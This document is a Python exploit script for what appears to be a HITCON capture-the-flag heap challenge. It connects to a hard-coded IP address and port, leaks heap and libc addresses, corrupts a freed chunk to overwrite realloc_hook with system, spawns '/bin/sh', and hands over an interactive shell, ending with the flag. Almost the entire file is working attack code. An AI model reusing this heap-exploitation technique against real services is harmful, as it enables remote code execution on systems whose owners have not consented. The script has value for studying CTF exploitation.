import sys
from socket import *
TARGET = ('52.68.53.28', 0xdada)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x

        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(str(x)+'\n')
    print "<%s" % x

import re
from struct import pack, unpack
def e(*args):
    return pack('<' + 'Q'*len(args), *args)
    

def sel_menu(n):
    rd(' . Exit')
    rd('Your choice : ')
    pr(n)

def add_food(fname):
    sel_menu(1) # add
    pr(fname) # name
    rd('Your choice : ')
    pr(0) # type

def show_food():
    sel_menu(2) # show
    return rd('Menu')

def edit_food(fi, fname):
    sel_menu(3) # edit
    pr(fi) # index
    pr(fname) # name
    pr(0) # type

def del_food(fi):
    sel_menu(4) # delete
    pr(fi) # index

def quit():
    sel_menu(7)

# Clear the food array, since we will need to construct a small-index food later.
del_food(8)
del_food(7)
del_food(6)
del_food(5)
del_food(4)
del_food(3)
del_food(2)
del_food(1)
del_food(0)

# Leak heap base
add_food('\x00')
hbase = re.findall(r'0\. Name : (......)\n', show_food())
if not hbase:
    # This might happen if ASLR puts a null in the heap address.
    raise Exception("Couldn't find heap base; try again.")

hbase = hbase[0].ljust(8, '\x00')
hbase = unpack('<Q', hbase)[0] & ~0xfff
print 'heap base:', hex(hbase)

del_food(0)

# Delete some food types to free room for more upcoming names
for i in xrange(4):
    sel_menu(6)
    pr(0)

# Create a persistent (memory-leaked) name
# This one is just used to pad memory
add_food('A'*720 + '\x80\x00')
add_food("L" * 766)
del_food(0)
del_food(0)

# Create another persistent name
# This one sits adjacent to the new Food vector
# and has a suitable fake memory tag at the end
# so it can be allocated over (creating an overlap)
add_food('A'*720 + '\x80\x00')
add_food("L" * 766)
del_food(0)
del_food(0)

# Clear the input buffers to prevent garbage from appearing
add_food("\x00" * 766)
del_food(0)

# Add a shadow object, which will hold the freed pointer after resize
add_food('Q' * 117+'\0')

# Add our hapless victim, which will hold the freed name pointer
add_food('P' * 117+'\0')
sel_menu(3) # edit
pr(1) # index
pr('\x00' + 'A' * 8) # name
# this "fails" so no food type is needed

# The victim's name is now freed!
# Allocate a bunch of food until the vector resizes.
for i in xrange(10):
    add_food(str(i))
for i in xrange(10,15):
    # These names are longer so they end up using the previously freed food types
    # This prevents the heap from growing too far past the memory leak object
    # and pushing our new vector away
    add_food(str(i)*5)

# The vector resized. The new vector's shadow object allocated the freed pointer, and then
# the pointer was freed again when the old vector's victim object was freed.

# Corrupt the first 8 bytes of the freed object (next ptr)
# This points to the fake memory chunk in the leaked name we made above.
edit_food(0, e(hbase + 0xa60+720-8))

# Leak the libc base
data = show_food()
print repr(data)
libc_base = re.findall('2. Name : (......)\n', data)
if not libc_base:
    raise Exception("Couldn't find libc base; try again.")
libc_base = libc_base[0].ljust(8, '\x00')
libc_base = unpack('<Q', libc_base)[0] - 0x3be730 # somewhere in main_arena
print 'libc base:', hex(libc_base)

# Deallocate a bunch of objects
for i in xrange(14):
    del_food(17 - i)

show_food()

# Allocate an object overlapping the vector<Food>
# This object overlaps its own entry, so that on exit from the constructor
# the "renamed" bit is set back to zero
# The name is set to the address of realloc_hook in libc
system = libc_base + 0x46640
realloc_hook = libc_base + 0x3BE730
vector_payload = 'A' * 8 + 'B' * 24 * 4 + '\x80' * 8 + e(realloc_hook).strip('\x00')

add_food(vector_payload)

# Overwrite realloc_hook to point at libc
edit_food(4, e(system).rstrip('\x00'))

# Add a food and realloc it to trigger our shell
add_food('/bin/sh;#\0')
edit_food(5, 'A'*16)

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

# hitcon{sH3lL_1s_4_d3L1c10Us_f0oD_1S_N7_17}
